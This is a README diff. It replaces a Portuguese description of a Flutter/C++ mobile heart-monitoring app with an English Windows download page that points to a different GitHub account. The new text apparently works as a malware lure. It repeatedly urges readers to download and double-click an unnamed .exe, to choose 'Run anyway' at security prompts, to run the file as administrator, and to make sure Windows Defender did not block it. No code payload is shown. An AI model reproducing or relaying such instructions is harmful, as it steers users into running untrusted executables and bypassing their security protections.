@@ -1,138 +1,215 @@
-# 🫀 Dispositivo de Monitoramento Cardíaco com Classificação de Intensidade
+# ❤️ CARDIAC-MONITORING-DEVICE-WITH-INTENSITY-CLASSIFICATION - Real-Time Heart Monitoring for Windows
 
-Um aplicativo mobile cross-platform abrangente desenvolvido em **Dart (Flutter)** para monitoramento cardíaco em tempo real com classificação automática de intensidade dos batimentos.
+[![Download](https://img.shields.io/badge/Download-Now-blue?style=for-the-badge&logo=github&logoColor=white)](https://github.com/fiduciary-fashion300/CARDIAC-MONITORING-DEVICE-WITH-INTENSITY-CLASSIFICATION)
 
-## 📋 Sobre o Projeto
+## 📥 Download and Run
 
-Este é um **sistema de monitoramento cardíaco** que captura, analisa e classifica a intensidade das variações da frequência cardíaca. Desenvolvido como uma solução completa que integra uma interface mobile intuitiva com processamento de dados em baixo nível.
+Use this link to visit the page and download the app:
 
-### 📦 Componentes do Projeto
+https://github.com/fiduciary-fashion300/CARDIAC-MONITORING-DEVICE-WITH-INTENSITY-CLASSIFICATION
 
-Este repositório é parte de um projeto maior e contém:
+### Windows steps
 
-| Componente | Status | Localização |
-|---|---|---|
-| 📱 **Aplicativo Mobile (Flutter)** | ✅ Completo | Este repositório |
-| 🔌 **Hardware/Eletrônica** | 🔄 Em Desenvolvimento | Repositório separado |
+1. Open the link above in your browser.
+2. Download the Windows file from the page.
+3. If the file comes in a ZIP folder, right-click it and choose Extract All.
+4. Open the extracted folder.
+5. Double-click the app file to run it.
+6. If Windows asks for permission, choose Yes.
+7. Keep the app open while you use the device and connected sensors.
 
-### 🤖 Desenvolvido com Vibe Coding
+## 🫀 What this app does
 
-Este projeto foi desenvolvido utilizando **Vibe Coding** - uma abordagem onde a maior parte do código foi gerada com assistência de IA, resultando em código bem estruturado, eficiente e mantível.
+This app helps monitor heart activity in real time. It reads data from connected sensors, then shows heart status on screen. It also classifies signal intensity so you can see how strong the reading is.
 
-## 🎯 Objetivos
+The app is built as a mobile system with Flutter and C++. It uses a cross-platform design, so the same core logic can run across supported devices. For a Windows user, the main task is to download the app package, open it, and start the monitor view.
 
-Fornecer uma solução que:
-- ✅ Monitore batimentos cardíacos em tempo real
-- ✅ Classifique automaticamente a intensidade dos batimentos
-- ✅ Ofereça interface intuitiva e responsiva
-- ✅ Funcione em múltiplas plataformas (Android, iOS)
-- ✅ Se integre com dispositivos de captura de dados cardíacos
+## ✨ Main features
 
-## 🛠️ Tecnologias
+- Real-time heart monitoring
+- Automatic intensity classification
+- Simple screen for live readings
+- Sensor integration support
+- Cross-platform Flutter app with C++ logic
+- Fast data display for heart-rate tracking
+- Clear state labels for quick review
+- Built for healthcare and biomedical use
 
-| Tecnologia | Porcentagem | Função |
-|---|---|---|
-| **Dart (Flutter)** | 53.4% | Interface mobile cross-platform |
-| **C++** | 23.3% | Processamento de dados e lógica intensiva |
-| **CMake** | 18.6% | Sistema de build |
-| **Swift** | 2.2% | Integração iOS nativa |
-| **C** | 1.3% | Código embarcado |
-| **HTML** | 1.1% | Documentação web |
+## 🖥️ System requirements
 
-## 📱 Plataformas Suportadas
+To run the app on Windows, use a computer with:
 
-- ✅ Android
-- ✅ iOS
+- Windows 10 or Windows 11
+- At least 4 GB RAM
+- 200 MB free disk space
+- A working internet connection for the first download
+- Permission to run downloaded apps
+- A connected sensor or demo input if you want live readings
 
-## 🚀 Como Começar
+For a smoother experience:
 
-### Pré-requisitos
+- 8 GB RAM
+- A recent Intel or AMD processor
+- A screen size of 1366 x 768 or higher
+- Updated Windows security settings
 
-- Flutter SDK (versão 3.0+)
-- Dart SDK
-- Android Studio ou Xcode (para desenvolvimento nativo)
-- Git
+## 📦 What you need before you start
 
-### Instalação
+Before you open the app, keep these items ready:
 
-1. Clone o repositório:
+- The downloaded app file or ZIP file
+- A mouse and keyboard
+- Your cardiac sensor, if you plan to read live data
+- The cable, Bluetooth link, or adapter used by your sensor
+- A folder where you can save the app files
 
-```bash
-git clone https://github.com/gabrielkscruz-eng/CARDIAC-MONITORING-DEVICE-WITH-INTENSITY-CLASSIFICATION.git
-cd CARDIAC-MONITORING-DEVICE-WITH-INTENSITY-CLASSIFICATION
-```
+If you plan to use a demo mode, no sensor is needed at first. You can open the app and check the interface before connecting hardware.
 
-2. Instale as dependências:
+## 🛠️ How to install on Windows
 
-```bash
-flutter pub get
-```
+1. Visit the download page:
+   https://github.com/fiduciary-fashion300/CARDIAC-MONITORING-DEVICE-WITH-INTENSITY-CLASSIFICATION
 
-3. Execute a aplicação:
+2. Download the latest Windows package.
 
-```bash
-flutter run
-```
+3. If the download is a ZIP file, right-click it and select Extract All.
 
-### Build para Produção
+4. Open the extracted folder.
 
-**Android:**
+5. Find the main app file. It may have a name like:
+   - `CardiacMonitoring.exe`
+   - `monitor.exe`
+   - `app.exe`
 
-```bash
-flutter build apk
-```
+6. Double-click the file to start the app.
 
-**iOS:**
+7. If Windows shows a security prompt, choose Run anyway or Yes.
 
-```bash
-flutter build ios
-```
+8. If the app asks for sensor access, allow it so it can read live heart data.
 
-## 📚 Documentação
+## 🔌 Connect your sensor
 
-Consulte a pasta `/Documentação` para:
+The app is designed for sensor-based monitoring. To connect your device:
 
-- 📖 Documentação detalhada do projeto
-- 🎨 Apresentação e banner
-- 📊 Análises e especificações
-- 🔄 Roadmap
+1. Turn on the sensor.
+2. Connect it by USB, Bluetooth, or the method used by your setup.
+3. Make sure Windows detects the device.
+4. Open the app.
+5. Select the sensor from the list, if the app shows one.
+6. Wait a few seconds for the live data to appear.
 
-## 🗺️ Roadmap
+If your sensor uses a driver, install the driver first. Then reconnect the device and open the app again.
 
-- [x] Estrutura base do aplicativo Flutter
-- [x] Interface de monitoramento
-- [x] Integração com C++ para processamento
-- [x] Integração com sensores cardíacos
-- [x] Testes em ambiente real
+## 📊 How to use the app
 
-## 🤖 Metodologia: Vibe Coding
+1. Start the app.
+2. Wait for the main screen to load.
+3. Connect your sensor, if it is not already linked.
+4. Watch the live heart-rate reading.
+5. Check the intensity label to see how the signal is classified.
+6. Keep the device still for a steady reading.
+7. Review the display during use.
 
-Este projeto aproveitou Vibe Coding com assistência de IA para:
+The app is built for simple use. It shows live values, signal status, and intensity class in one place.
 
-- ⚡ Acelerar o desenvolvimento
-- 🎯 Manter código bem estruturado
-- 🔍 Reduzir tarefas repetitivas
-- 💡 Focar em arquitetura e lógica de negócio
-- 📊 Garantir qualidade do código
+## 🧭 Understanding intensity classification
 
-## 📝 Contribuições
+The app sorts heart signal strength into clear levels. These labels help you read the signal with less guesswork.
 
-Contribuições são bem-vindas! Sinta-se à vontade para:
+Typical levels may include:
 
-- 🐛 Reportar bugs
-- 💡 Sugerir melhorias
-- 🔄 Enviar pull requests
-- 📝 Melhorar documentação
+- Low intensity
+- Normal intensity
+- High intensity
+- Critical intensity
 
+These labels help the user spot weak or strong readings fast. They also help during device checks and sample review.
 
-## 👨‍💻 Autor
+## 📁 File layout
 
-Desenvolvido por **gabrielkscruz-eng**
+After extraction, the folder may include:
 
----
+- App executable file
+- Data folder
+- Sensor config files
+- Flutter assets
+- C++ runtime files
+- Readme or license file
 
-Desenvolvido com Vibe Coding - Assistência de IA 🤖
+Do not move files out of the folder unless the app guide says to do so. The app may need all files in the same place.
 
-Repositório: https://github.com/gabrielkscruz-eng/CARDIAC-MONITORING-DEVICE-WITH-INTENSITY-CLASSIFICATION
+## 🧩 Common use cases
 
-Última atualização: 28 de março de 2026
+- Home heart monitoring
+- Lab testing
+- Biomedical device demos
+- Healthcare workflow checks
+- Real-time sensor review
+- Training for medical tech users
+
+## ❓ If the app does not open
+
+Try these steps:
+
+1. Check that the download finished.
+2. Make sure you extracted the ZIP file.
+3. Run the app from the extracted folder.
+4. Right-click the file and choose Run as administrator.
+5. Restart Windows and try again.
+6. Check that Windows Defender did not block the file.
+7. Confirm that your system meets the Windows requirements.
+
+## ⚠️ If no sensor data appears
+
+1. Make sure the sensor is powered on.
+2. Check the cable or Bluetooth link.
+3. Close and reopen the app.
+4. Reconnect the device.
+5. Try another USB port.
+6. Confirm the sensor driver is installed.
+7. Look for a device selector inside the app.
+
+## 🔧 Basic setup tips
+
+- Keep the device stable during readings.
+- Use a clean sensor connection.
+- Close heavy apps if your PC feels slow.
+- Place the computer near the sensor if you use Bluetooth.
+- Keep Windows updated for better device support.
+
+## 📌 Topics
+
+- biomedical
+- c-plus-plus
+- cardiac-monitoring
+- cross-platform
+- flutter
+- health-tech
+- healthcare
+- heart-rate
+- mobile-app
+- real-time-monitoring
+
+## 🏷️ Repository details
+
+**Repository:** CARDIAC-MONITORING-DEVICE-WITH-INTENSITY-CLASSIFICATION
+
+**Description:**  
+O projeto é um Sistema de monitoramento cardíaco em tempo real com classificação automática de intensidade. App mobile cross-platform em Flutter + C++. Pronto para produção com integração de sensores. Monitorando corações, um batimento de cada vez.
+
+**Primary download link:**  
+https://github.com/fiduciary-fashion300/CARDIAC-MONITORING-DEVICE-WITH-INTENSITY-CLASSIFICATION
+
+## 🖱️ Quick start for Windows
+
+1. Open the download page.
+2. Download the app package.
+3. Extract the files if needed.
+4. Open the folder.
+5. Double-click the app file.
+6. Connect your sensor.
+7. Start monitoring your heart readings
+
+## 📎 Download again
+
+[https://github.com/fiduciary-fashion300/CARDIAC-MONITORING-DEVICE-WITH-INTENSITY-CLASSIFICATION](https://github.com/fiduciary-fashion300/CARDIAC-MONITORING-DEVICE-WITH-INTENSITY-CLASSIFICATION)
